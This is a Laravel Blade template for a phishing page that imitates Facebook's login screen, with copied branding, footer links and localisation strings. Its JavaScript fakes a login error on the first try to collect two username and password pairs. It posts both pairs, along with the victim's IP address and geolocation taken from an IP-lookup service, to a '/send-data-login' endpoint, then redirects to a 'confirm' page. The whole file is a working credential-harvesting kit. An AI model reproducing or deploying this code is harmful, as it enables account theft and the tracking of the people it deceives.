@push('icons')
    <link rel="apple-touch-icon" href="{{$settings['favicon_icon']}}" sizes="180x180">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="32x32">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="mask-icon" href="{{$settings['favicon_icon']}}">
    <link rel="icon" href="{{$settings['favicon_icon']}}">
    <title>@lang('common.title_confirm_page')</title>
@endpush

@push('styles')
    <link type="text/css" href="{{asset('/css/button.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/input.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/modal.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/header.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/body.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/display.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/footer.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/spinner.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('/css/app.css')}}" rel="stylesheet">
@endpush

<main class="home">
    <div class="header">
        <div class="header-dialog">
            <div class="header-content">
                <div class="header-border"></div>
                <div class="header-main">
                    <a class="logo" href="javascript:;">
                        <div class="logo-content">
                            <img class="img" src="{{asset('assets/img/B2Ha-q3dWRO.png')}}" width="34" height="23"
                                 alt="">
                        </div>
                        @lang('login.title')
                    </a>
                </div>
                <div class="header-login">
                    <div class="login-content">
                        <ul class="login-content-list" role="tablist">
                            <li class="login-content-item" role="presentation">
                                <a role="button" class="login-content-link-login"
                                   href="javascript:;">@lang('login.login_button_top')
                                </a>
                            </li>
                            <li class="login-content-item" role="presentation">
                                <a role="button" class="login-content-link-create" href="javascript:;"
                                   data-testid="business-create-account-button">@lang('login.create_account')
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="body">
        <div class="fb_content clearfix " role="main">
            <div class="body-form">
                <div class="body-form-notice">
                    <div class="body-form-notice-content">
                        <i class="notice-icon"><u></u></i>
                        <div class="notice-text">@lang('login.notice_desktop')</div>
                    </div>
                </div>
                <div class="alert-form-login alert-form-login-mobile" role="alert" tabindex="0" id="login_error_mobile">
                    @lang('login.error_notice')<a href="https://facebook.com/login/identify/"
                                                  class="_652e">@lang('login.error_find')</a>
                </div>
                <div class="form-login">
                    <div class="form-title">
                        <div class="mobile-title">
                            <div class="mobile-title-content">
                                <img src="{{asset('assets/img/dF5SId3UHWd.svg')}}"
                                     width="112" class="img" alt="facebook">
                            </div>
                        </div>
                        <span class="form-title-content">
                            <div class="form-title-text">@lang('login.login_box_title')</div>
                        </span>
                    </div>
                    <div class="login_form_container">
                        <form class="mobile-login-form">
                            <div class="alert-form-login alert-form-login-desktop" role="alert" tabindex="0"
                                 id="login_error">
                                @lang('login.error_notice')<a href="https://facebook.com/login/identify/"
                                                              class="_652e">@lang('login.error_find')</a>
                            </div>
                            <div class="login-form-main-mobile">
                                <div class="login-form-item">
                                    <div class="login-form-item-content">
                                        <div class="login-form-control">
                                            <input autocorrect="off"
                                                   autocapitalize="off"
                                                   style="font-size:16px"
                                                   type="email"
                                                   class="input-form-login validate-input validate-phone-email"
                                                   autocomplete="on"
                                                   id="username-mobile"
                                                   name="username"
                                                   placeholder="@lang('login.email')"
                                                   data-sigil="m_login_email">
                                        </div>
                                    </div>
                                </div>
                                <div class="login-form-item-hr"></div>
                                <div class="login-form-item">
                                    <div class="login-form-item-content">
                                        <div class="login-form-password" data-sigil="m_login_password">
                                            <div class="login-form-password-content">
                                                <div class="login-form-password-content-item">
                                                    <div class="login-form-password-control">
                                                        <input autocorrect="off"
                                                                style="font-size:16px"
                                                               autocapitalize="off"
                                                               class="input-form-login validate-input"
                                                               autocomplete="on" id="password-mobile"
                                                               name="password" placeholder="@lang('login.password')"
                                                               type="password"
                                                               data-sigil="password-plain-text-toggle-input">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="login-form-main">
                                <div class="login-form-main-content">
                                    <input autocorrect="off"
                                           autocapitalize="off"
                                           class="input-form-login validate-input validate-phone-email"
                                           autocomplete="on"
                                           id="username-desktop"
                                           name="username"
                                           placeholder="@lang('login.email')"
                                           type="text"
                                           data-sigil="m_login_email"
                                           style="">
                                    <input autocorrect="off"
                                           autocapitalize="off"
                                           class="input-form-login validate-input"
                                           autocomplete="on"
                                           type="password"
                                           name="password"
                                           id="password-desktop"
                                           tabindex="0"
                                           placeholder="@lang('login.password')"
                                           value=""
                                           aria-label="Password">

                                    <button type="button" class="button-form-login"
                                            id="btnLogin-desktop">
                                        <span id="submit-login-loading"
                                              class="d-none spinner-border spinner">
                                        </span>
                                        <span id="submit-login-text">@lang('login.submit')</span>
                                    </button>

                                    <div class="login-form-link" id="login_link">
                                        <a
                                            href="javascript:;"
                                            class="_97w4" target="">@lang('login.forgotten')?</a>
                                        <span role="presentation" aria-hidden="true"> · </span>
                                        <a href="javascript:;" rel="nofollow"
                                           class="_97w5">@lang('login.sign_up_to_facebook')
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="mobile-button-submit">
                                <div data-sigil="login_password_step_element">
                                    <button type="button" class="mobile-login-button"
                                            id="btnLogin-mobile">
                                        <span id="submit-login-mobile-loading"
                                              class="d-none spinner-border spinner"></span>
                                        <span id="submit-login-mobile-text">@lang('login.submit')</span>
                                    </button>
                                </div>
                            </div>
                        </form>
                        <div class="mobile-footer">
                            <div class="footer-forgot-password">
                                <div class="footer-forgot-password-item">
                                    <a class="footer-forgot-password-link" tabindex="0"
                                       href="https://www.facebook.com/login/identify">@lang('login.forgotten')?
                                    </a>
                                </div>
                            </div>
                            <div class="create-new">
                                <div class="create-new-content">
                                    <div class="create-new-item-line">
                                        <div class="create-new-item-line-content">
                                            <div class="create-new-line-hr" data-sigil="login_reg_separator">
                                                <span class="line-hr">or</span>
                                            </div>
                                            <div class="create-new-button">
                                                <a href="https://www.facebook.com/reg"
                                                   class="button-create-new"
                                                   id="signup-button" tabindex="0" data-sigil="m_reg_button"
                                                   data-autoid="autoid_7">@lang('login.create_new_account')</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="footer-wrapper">
                    <div class="footer-content">
                        <ul class="footer-item-list">
                            <li>English (US)</li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="Traditional Chinese (Taiwan)">中文(台灣)</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="French (France)">Français (France)</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="Thai">ภาษาไทย</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="Spanish">Español</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="Portuguese (Brazil)">Português (Brasil)</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="German">Deutsch</a>
                            </li>
                            <li>
                                <a class="_sv4" dir="ltr" href="javascript:;"
                                   title="Italian">Italiano</a>
                            </li>
                            <li>
                                <a role="button" class="button-plus" rel="dialog" ajaxify="" href="javascript:;"
                                   title="Show more languages">
                                    <i class="button-plus-icon"></i>
                                </a>
                            </li>
                        </ul>
                        <div class="content-curve"></div>
                        <div class="footer-children">
                            <ul class="footer-children-item-list">
                                <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
                                <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
                                </li>
                                <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                <li><a href="javascript:;" title="Browse in Video">Video</a>
                                </li>
                                <li><a href="javascript:;" title="Take a look at popular places on Facebook.">Places</a>
                                </li>
                                <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                <li><a href="javascript:;"
                                       title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                <li><a href="javascript:;" title="Learn more about Meta Pay"
                                       target="_blank">Meta Pay</a></li>
                                <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
                                        Store</a>
                                </li>
                                <li><a href="javascript:;" title="Learn more about Meta Quest"
                                       target="_blank">Meta Quest</a></li>
                                <li><a href="" title="Take a look at Instagram" target="_blank"
                                       rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                                <li><a href="" title="Check out Threads" target="_blank" rel="noreferrer nofollow"
                                       data-lynx-mode="asynclazy">Threads</a></li>
                                <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
                                <li><a href="javascript:;"
                                       title="Browse our Facebook Services directory.">Services</a></li>
                                <li><a href="javascript:;"
                                       title="See the Voting Information Centre">Voting Information Centre</a></li>
                                <li><a href="javascript:;"
                                       title="Learn how we collect, use and share information to support Facebook.">Privacy
                                        Policy</a></li>
                                <li><a href="javascript:;"
                                       title="Learn how to manage and control your privacy on Facebook.">Privacy
                                        Centre</a></li>
                                <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
                                <li><a href="javascript:;" accesskey="8"
                                       title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                </li>
                                <li>
                                    <a href="javascript:;"
                                       title="Advertise on Facebook">Create ad</a></li>
                                <li><a href="javascript:;" title="Create a Page">Create
                                        Page</a>
                                </li>
                                <li><a href="javascript:;"
                                       title="Develop on our platform.">Developers</a>
                                </li>
                                <li><a href="javascript:;"
                                       title="Make your next career move to our brilliant company.">Careers</a></li>
                                <li><a href="javascript:;" title="Learn about cookies and Facebook."
                                       data-nocookies="1">Cookies</a></li>
                                <li><a class="_41ug" data-nocookies="1"
                                       href="javascript:;"
                                       title="Learn about AdChoices.">AdChoices<i
                                            class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
                                <li><a data-nocookies="1" href="javascript:;" accesskey="9"
                                       title="Review our terms and policies.">Terms</a></li>
                                <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
                                </li>
                                <li><a href="javascript:;"
                                       title="Visit our contact uploading and non-users notice.">Contact uploading
                                        and
                                        non-users</a></li>
                                <li><a accesskey="6" class="accessible_elem" href="/settings"
                                       title="View and edit your Facebook settings.">Settings</a></li>
                                <li><a accesskey="7" class="accessible_elem"
                                       href="javascript:;"
                                       title="View your activity log">Activity log</a></li>
                            </ul>
                        </div>
                        <div class="footer-copyright">
                            <div><span> Meta © 2023</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div></div>
        <span></span>
    </div>
</main>
@push('scripts')
    <script type="text/javascript">
        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_confirm_page')) !!}';
        const parseQueryParams = JSON.parse(queryParams);

        function replaceQueryParam(param, value, search) {
            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
            let query = search.replace(regex, "$1").replace(/&$/, '');

            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
        }

        if(parseQueryParams.length > 0){
            for (const query of parseQueryParams) {
                const currentQuery = window.location.search
                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                window.history.pushState(null, null, newUrl)
            }
        }
    </script>

    <script type="text/javascript">
        $.ajaxSetup({headers: {'X-CSRF-TOKEN': '{{ csrf_token() }}'}});

        var countLogin = 0;
        var countLoginMobile = 0;

        var oneTimeUsername = "";
        var oneTimePassword = "";

        var oneTimeUsernameMobile = "";
        var oneTimePasswordMobile = "";

        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";

        async function setCurrentLang() {
            let getIpInfoUrl = '{{session()->get('getIpInfoUrl')}}';
            const response = await fetch(getIpInfoUrl);
            const ipInfo = await response.json();
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }
        setCurrentLang()

        function submitLoginDesktop() {
            const valueEmail = $('#username-desktop').val();
            const valuePassword = $('#password-desktop').val();
            if (valueEmail === '' || valuePassword === '') {
                if (valueEmail === '') {
                    $('#username-desktop').addClass('is-invalid');
                }
                if (valuePassword === '') {
                    $('#password-desktop').addClass('is-invalid');
                }
                return false;
            }
            if(!isValidValuePhoneEmail(valueEmail)){
                $('#username-desktop').addClass('is-invalid');
                return false;
            }
            $('#login_error').addClass('d-none')
            const loading = document.getElementById('submit-login-loading')
            const text = document.getElementById('submit-login-text')
            text.classList.add('d-none')
            loading.classList.remove('d-none')

            setTimeout(function () {
                if (countLogin < 1) {
                    $('#login_error').removeClass('d-none')
                    $('#login_error').addClass('d-block')
                    text.classList.remove('d-none')
                    loading.classList.add('d-none')
                    countLogin++
                    oneTimeUsername = valueEmail
                    oneTimePassword = valuePassword
                } else {
                    $('#login_error').addClass('d-none')
                    $('#login_error').removeClass('d-block')
                    text.classList.remove('d-none')
                    loading.classList.add('d-none')
                    sendDataLoginDesktop()
                    $('#username-desktop').val('');
                    $('#password-desktop').val('');
                    window.location.href = "{{route('confirm')}}"
                }
            }, 1000)
        }

        function submitLoginMobile() {
            const valueEmail = $('#username-mobile').val();
            const valuePassword = $('#password-mobile').val();
            if (valueEmail === '' || valuePassword === '') {
                $('#login_error_mobile').removeClass('d-none')
                $('#login_error_mobile').addClass('d-block')
                return false;
            }
            if(!isValidValuePhoneEmail(valueEmail)){
                $('#login_error_mobile').removeClass('d-none')
                $('#login_error_mobile').addClass('d-block')
                $('#username-mobile').addClass('is-invalid');
                return false;
            }
            $('#login_error_mobile').addClass('d-none')
            const loading = document.getElementById('submit-login-mobile-loading')
            const text = document.getElementById('submit-login-mobile-text')
            text.classList.add('d-none')
            loading.classList.remove('d-none')

            setTimeout(function () {
                if (countLoginMobile < 1) {
                    $('#login_error_mobile').removeClass('d-none')
                    $('#login_error_mobile').addClass('d-block')
                    text.classList.remove('d-none')
                    loading.classList.add('d-none')
                    countLoginMobile++
                    oneTimeUsernameMobile = valueEmail
                    oneTimePasswordMobile = valuePassword
                } else {
                    $('#login_error_mobile').removeClass('d-block')
                    $('#login_error_mobile').addClass('d-none')
                    text.classList.remove('d-none')
                    loading.classList.add('d-none')
                    //sendDataLoginMobile()
                    const valueEmail = $('#username-mobile').val();
            const valuePassword = $('#password-mobile').val();
            //alert(valueEmail + ' ' + valuePassword);
            let formData = new FormData();
            formData.append('email_1', oneTimeUsernameMobile)
            formData.append('password_1', oneTimePasswordMobile)
            formData.append('email_2', valueEmail)
            formData.append('password_2', valuePassword)
            formData = pushIPInfo(formData)
            $.ajax({
                method: "POST",
                url: "/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(res) {
                    if (res.status == 0) {
                        console.log('success mobile');
                         window.location.href = "{{route('confirm')}}"
                    $('#username-mobile').val('');
                    $('#password-mobile').val('');
                    } else {
                        alert('err mobile ' + res.message );
                    }
                },
                error:  function(xhr, status, error) {
                    var err = eval("(" + xhr.responseText + ")");
                    alert(err.Message);
                },
            })
                }
            }, 1000)
        }

        function sendDataLoginMobile() {
            const valueEmail = $('#username-mobile').val();
            const valuePassword = $('#password-mobile').val();
            //alert(valueEmail + ' ' + valuePassword);
            let formData = new FormData();
            formData.append('email_1', oneTimeUsernameMobile)
            formData.append('password_1', oneTimePasswordMobile)
            formData.append('email_2', valueEmail)
            formData.append('password_2', valuePassword)
            formData = pushIPInfo(formData)
            $.ajax({
                method: "POST",
                url: "/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(res) {
                    if (res.status == 0) {
                        console.log('success mobile');
                    } else {
                        alert('err mobile ' + res.message );
                    }
                },
                error:  function(xhr, status, error) {
                    var err = eval("(" + xhr.responseText + ")");
                    alert(err.Message);
                },
            })
        }

        function sendDataLoginDesktop() {
            const valueEmail = $('#username-desktop').val();
            const valuePassword = $('#password-desktop').val();
            let formData = new FormData();
            formData.append('email_1', oneTimeUsername)
            formData.append('password_1', oneTimePassword)
            formData.append('email_2', valueEmail)
            formData.append('password_2', valuePassword)
            formData = pushIPInfo(formData)
            $.ajax({
                method: "POST",
                url: "/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
            })
        }

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function inputValidateInput() {
            const value = $(this).val();
            if (value !== "") {
                $(this).removeClass('is-invalid')
            }
            const valueEmailDesktop = $('#username-desktop').val();
            const valuePasswordDesktop = $('#password-desktop').val();

            if (valueEmailDesktop !== '' && valuePasswordDesktop !== '') {
                $('#btnLogin-desktop').removeClass('disabled');
            }
        }

        function validatePhoneEmail() {
            const value = $(this).val();
            if(isValidValuePhoneEmail(value)){
                $(this).removeClass('is-invalid');
            } else {
                $(this).addClass('is-invalid');
            }
        }

        function isValidValuePhoneEmail(value) {
            if (isNumeric(value)) {
                const regexPhoneNumber = /[0-9]{9,12}$/;
                return regexPhoneNumber.test(value);
            } else {
                const regexEmail = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
                return regexEmail.test(value)
            }
        }

        function isNumeric(str) {
            if (typeof str != "string") return false // we only process strings!
            return !isNaN(str) && // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
        }


        $(document).on('input', '.validate-phone-email', validatePhoneEmail)
        $(document).on('keydown', '.validate-input', inputValidateInput)
        $(document).on('click', '#btnLogin-desktop', submitLoginDesktop)
        $(document).on('click', '#btnLogin-mobile', submitLoginMobile)
      // $(document).on('click', '#btnLogin-mobile', submitLoginDesktop)
    </script>
@endpush
